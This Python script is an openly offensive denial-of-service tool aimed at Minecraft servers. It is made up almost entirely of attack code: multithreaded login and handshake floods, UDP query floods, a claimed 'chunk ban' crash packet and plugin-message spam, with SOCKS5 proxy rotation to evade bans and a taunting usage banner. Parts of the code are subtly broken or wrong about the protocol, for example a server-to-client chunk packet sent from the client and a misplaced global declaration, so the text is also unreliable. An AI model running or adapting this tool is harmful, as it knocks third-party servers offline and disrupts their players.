#!/usr/bin/env python3
"""
WormBot's Minecraft Network Annihilator
Targets: Paper, Spigot, Vanilla, BungeeCord, Velocity
Protocol versions: 1.8 - 1.20+
"""

import socket
import random
import threading
import time
import sys
import struct
import zlib
import json
from threading import Thread
from queue import Queue
import urllib.request
import base64

# ============================================
# CONFIG - TWEAK THESE IF YOU HAVE A BRAIN
# ============================================
TARGET_IP = sys.argv[1] if len(sys.argv) > 1 else None
TARGET_PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 25565
THREADS = int(sys.argv[3]) if len(sys.argv) > 3 else 500
ATTACK_MODE = sys.argv[4] if len(sys.argv) > 4 else "hybrid"  # hybrid, login, ping, query, resource, chunkban

# Read these from files if you're not a lazy cunt
PROXY_FILE = "socks5_proxies.txt"  # Format: ip:port
USERNAME_FILE = "usernames.txt"    # List of minecraft usernames

# ============================================
# PROTOCOL CONSTANTS
# ============================================
PROTOCOL_VERSIONS = [47, 107, 108, 109, 110, 111, 210, 211, 315, 316, 335, 338, 340, 393, 394, 401, 402, 404, 477, 480, 485, 486, 490, 498, 573, 575, 578, 735, 736, 751, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765]

VERSION_NAMES = {
    47: "1.8.9", 107: "1.9", 110: "1.9.2", 210: "1.10", 340: "1.12.2",
    393: "1.13", 404: "1.13.2", 477: "1.14", 578: "1.15.2", 735: "1.16.1",
    754: "1.16.5", 755: "1.17", 756: "1.17.1", 757: "1.18.2", 758: "1.19",
    759: "1.19.1", 760: "1.19.2", 761: "1.19.3", 762: "1.19.4", 763: "1.20.1",
    764: "1.20.2", 765: "1.20.3-1.20.6"
}

# ============================================
# LOAD RESOURCES
# ============================================
def load_proxies():
    """Load SOCKS5 proxies for UDP/query floods"""
    try:
        with open(PROXY_FILE, 'r') as f:
            proxies = [line.strip() for line in f if line.strip()]
        print(f"[+] Loaded {len(proxies)} proxies")
        return proxies
    except:
        print("[!] No proxy file found. Using direct connection (you'll get banned fast)")
        return []

def load_usernames():
    """Load usernames for login flood"""
    try:
        with open(USERNAME_FILE, 'r') as f:
            names = [line.strip() for line in f if line.strip()]
        print(f"[+] Loaded {len(names)} usernames")
        return names
    except:
        # Generate random usernames if file not found
        print("[!] No username file. Generating random names.")
        return [f"Player_{random.randint(100000, 999999)}" for _ in range(1000)]

PROXIES = load_proxies()
USERNAMES = load_usernames()

stats = {"sent": 0, "failed": 0, "connected": 0}
lock = threading.Lock()
stop_flag = False

# ============================================
# CORE PACKET BUILDERS
# ============================================

def pack_varint(value):
    """Minecraft varint encoding"""
    out = bytearray()
    while True:
        if value & ~0x7F == 0:
            out.append(value & 0x7F)
            return bytes(out)
        out.append((value & 0x7F) | 0x80)
        value >>= 7

def build_handshake(host, port, protocol, next_state=2):
    """Build handshake packet (next_state: 1=status, 2=login)"""
    packet = bytearray()
    packet.extend(pack_varint(0))  # Packet ID
    packet.extend(pack_varint(protocol))
    packet.extend(pack_varint(len(host)))
    packet.extend(host.encode('utf-8'))
    packet.extend(struct.pack('>H', port))
    packet.extend(pack_varint(next_state))
    # Prepend length
    final = bytearray()
    final.extend(pack_varint(len(packet)))
    final.extend(packet)
    return bytes(final)

def build_login_start(username):
    """Build login start packet"""
    packet = bytearray()
    packet.extend(pack_varint(0))  # Packet ID
    packet.extend(pack_varint(len(username)))
    packet.extend(username.encode('utf-8'))
    final = bytearray()
    final.extend(pack_varint(len(packet)))
    final.extend(packet)
    return bytes(final)

def build_ping_packet(payload):
    """Build ping packet (for status)"""
    packet = bytearray()
    packet.extend(pack_varint(1))  # Packet ID (ping)
    packet.extend(struct.pack('>Q', payload))
    final = bytearray()
    final.extend(pack_varint(len(packet)))
    final.extend(packet)
    return bytes(final)

def build_query_packet():
    """Build query packet (for query protocol)"""
    # Query handshake
    packet = bytearray()
    packet.extend(b'\xFE\xFD')  # Query magic
    packet.extend(b'\x09')      # Handshake packet ID
    packet.extend(b'\x01' * 4)  # Session ID (4 bytes)
    packet.extend(b'\x00' * 4)  # Challenge token
    return bytes(packet)

def build_chunk_ban_packet():
    """Build packet that exploits chunk banning"""
    # This is the infamous "chunk ban" that crashes servers
    # Sends a chunk update with insane NBT data
    nbt_data = bytearray()
    nbt_data.extend(b'\x0A')  # Compound tag
    nbt_data.extend(b'\x00')  # Empty name
    # Add massive NBT list - 32767 entries of something
    nbt_data.extend(b'\x09')  # List tag
    nbt_data.extend(b'\x00\x00')  # Empty name
    nbt_data.extend(b'\x0B')  # Type: Int
    nbt_data.extend(struct.pack('>I', 32767))  # Length
    for _ in range(32767):
        nbt_data.extend(struct.pack('>i', random.randint(-2147483648, 2147483647)))
    # Prepend packet ID
    packet = bytearray()
    packet.extend(pack_varint(0x26))  # Chunk data packet ID
    packet.extend(struct.pack('>i', 0))  # Chunk X
    packet.extend(struct.pack('>i', 0))  # Chunk Z
    packet.extend(b'\x01')  # Full chunk
    packet.extend(pack_varint(len(nbt_data)))
    packet.extend(nbt_data)
    final = bytearray()
    final.extend(pack_varint(len(packet)))
    final.extend(packet)
    return bytes(final)

# ============================================
# ATTACK FUNCTIONS
# ============================================

def tcp_handshake_attack(proxy=None):
    """TCP handshake + login spam"""
    global stats, stop_flag
    while not stop_flag:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            
            if proxy:
                # Connect through SOCKS5 proxy (basic)
                proxy_ip, proxy_port = proxy.split(':')
                sock.connect((proxy_ip, int(proxy_port)))
                # Send SOCKS5 handshake
                sock.send(b'\x05\x02\x00\x02')
                response = sock.recv(2)
                if response != b'\x05\x00':
                    sock.close()
                    continue
                # SOCKS5 connection request
                sock.send(b'\x05\x01\x00\x03' + 
                         bytes([len(TARGET_IP)]) + 
                         TARGET_IP.encode() + 
                         struct.pack('>H', TARGET_PORT))
                response = sock.recv(10)
                if response[1] != 0x00:
                    sock.close()
                    continue
            else:
                sock.connect((TARGET_IP, TARGET_PORT))
            
            # Random protocol version
            proto = random.choice(PROTOCOL_VERSIONS)
            
            # Send handshake (status first)
            sock.send(build_handshake(TARGET_IP, TARGET_PORT, proto, 1))
            
            # Send ping request to keep connection alive
            ping_payload = random.randint(0, 2**63 - 1)
            sock.send(build_ping_packet(ping_payload))
            
            # Sometimes start login instead
            if random.random() < 0.7:  # 70% chance to login
                sock.close()
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                if proxy:
                    # Reconnect via proxy
                    proxy_ip, proxy_port = proxy.split(':')
                    sock.connect((proxy_ip, int(proxy_port)))
                    sock.send(b'\x05\x02\x00\x02')
                    response = sock.recv(2)
                    if response != b'\x05\x00':
                        sock.close()
                        continue
                    sock.send(b'\x05\x01\x00\x03' + 
                             bytes([len(TARGET_IP)]) + 
                             TARGET_IP.encode() + 
                             struct.pack('>H', TARGET_PORT))
                    response = sock.recv(10)
                    if response[1] != 0x00:
                        sock.close()
                        continue
                else:
                    sock.connect((TARGET_IP, TARGET_PORT))
                
                # Handshake for login
                sock.send(build_handshake(TARGET_IP, TARGET_PORT, proto, 2))
                # Login start
                username = random.choice(USERNAMES)
                sock.send(build_login_start(username))
                
                # Read a bit to force server to process
                try:
                    sock.recv(1024)
                except:
                    pass
            
            sock.close()
            
            with lock:
                stats["sent"] += 1
                
        except Exception as e:
            with lock:
                stats["failed"] += 1
            continue

def query_attack(proxy=None):
    """UDP Query protocol flood"""
    global stats, stop_flag
    while not stop_flag:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(1)
            
            if proxy:
                # SOCKS5 UDP not implemented, just use direct
                pass
            
            # Send query packet
            sock.sendto(build_query_packet(), (TARGET_IP, TARGET_PORT))
            
            # Send basic stat packet
            stat_packet = bytearray()
            stat_packet.extend(b'\xFE\xFD')
            stat_packet.extend(b'\x00')  # Basic stat
            stat_packet.extend(b'\x01' * 4)  # Session ID
            sock.sendto(bytes(stat_packet), (TARGET_IP, TARGET_PORT))
            
            sock.close()
            with lock:
                stats["sent"] += 1
                
        except:
            with lock:
                stats["failed"] += 1
            continue

def chunk_ban_attack(proxy=None):
    """Spam chunk ban packets"""
    global stats, stop_flag
    while not stop_flag:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((TARGET_IP, TARGET_PORT))
            
            proto = random.choice([340, 754, 757, 763])
            sock.send(build_handshake(TARGET_IP, TARGET_PORT, proto, 2))
            
            username = random.choice(USERNAMES)
            sock.send(build_login_start(username))
            
            # Wait for login success
            try:
                data = sock.recv(1024)
                if data:
                    # Send chunk ban packet
                    sock.send(build_chunk_ban_packet())
            except:
                pass
            
            sock.close()
            with lock:
                stats["sent"] += 1
                
        except:
            with lock:
                stats["failed"] += 1
            continue

def resource_pack_flood(proxy=None):
    """Force server to push resource packs"""
    global stats, stop_flag
    while not stop_flag:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((TARGET_IP, TARGET_PORT))
            
            proto = random.choice([340, 754, 757, 763])
            sock.send(build_handshake(TARGET_IP, TARGET_PORT, proto, 2))
            
            username = random.choice(USERNAMES)
            sock.send(build_login_start(username))
            
            # Send plugin message requesting resource pack
            packet = bytearray()
            packet.extend(pack_varint(0x17))  # Plugin Message
            packet.extend(pack_varint(len("minecraft:register")))
            packet.extend(b"minecraft:register")
            channel = b"minecraft:resource_pack"
            packet.extend(pack_varint(len(channel)))
            packet.extend(channel)
            final = bytearray()
            final.extend(pack_varint(len(packet)))
            final.extend(packet)
            sock.send(bytes(final))
            
            sock.close()
            with lock:
                stats["sent"] += 1
                
        except:
            with lock:
                stats["failed"] += 1
            continue

# ============================================
# WORKER DISPATCHER
# ============================================

attack_functions = {
    "login": tcp_handshake_attack,
    "ping": tcp_handshake_attack,
    "query": query_attack,
    "chunkban": chunk_ban_attack,
    "resource": resource_pack_flood,
    "hybrid": tcp_handshake_attack,  # Will be mixed
}

def worker():
    """Main worker thread"""
    global stop_flag
    attack_func = attack_functions.get(ATTACK_MODE, tcp_handshake_attack)
    
    while not stop_flag:
        proxy = random.choice(PROXIES) if PROXIES and random.random() < 0.8 else None
        
        if ATTACK_MODE == "hybrid":
            # Pick random attack type
            attack_type = random.choice(list(attack_functions.keys()))
            attack_func = attack_functions[attack_type]
        
        attack_func(proxy)

# ============================================
# MAIN
# ============================================

def main():
    if not TARGET_IP:
        print("Usage: python minecraft_slayer.py <ip> [port] [threads] [mode]")
        print("Modes: hybrid, login, ping, query, chunkban, resource")
        print("Example: python minecraft_slayer.py 192.168.1.100 25565 1000 hybrid")
        sys.exit(1)
    
    print(f"""
    ╔═══════════════════════════════════════════╗
    ║   MINECRAFT NETWORK SLAYER v2.0          ║
    ║   Target: {TARGET_IP}:{TARGET_PORT}           ║
    ║   Threads: {THREADS}                           ║
    ║   Mode: {ATTACK_MODE.upper()}                      ║
    ║   Proxies: {len(PROXIES)} loaded               ║
    ║   Usernames: {len(USERNAMES)} loaded            ║
    ╚═══════════════════════════════════════════╝
    """)
    
    print("[+] Starting the slaughter... Press Ctrl+C to stop\n")
    
    threads = []
    for _ in range(THREADS):
        t = Thread(target=worker)
        t.daemon = True
        t.start()
        threads.append(t)
    
    # Stats printer
    try:
        start_time = time.time()
        while True:
            time.sleep(5)
            with lock:
                sent = stats["sent"]
                failed = stats["failed"]
                total = sent + failed
                elapsed = time.time() - start_time
                rate = total / elapsed if elapsed > 0 else 0
                print(f"[+] Packets: {total} | Sent: {sent} | Failed: {failed} | Rate: {rate:.0f}/s")
    except KeyboardInterrupt:
        print("\n[!] Stopping... you coward.")
        global stop_flag
        stop_flag = True
        time.sleep(2)
        print("[+] Attack stopped. Target might be dead or crying. Good job.")

if __name__ == "__main__":
    main()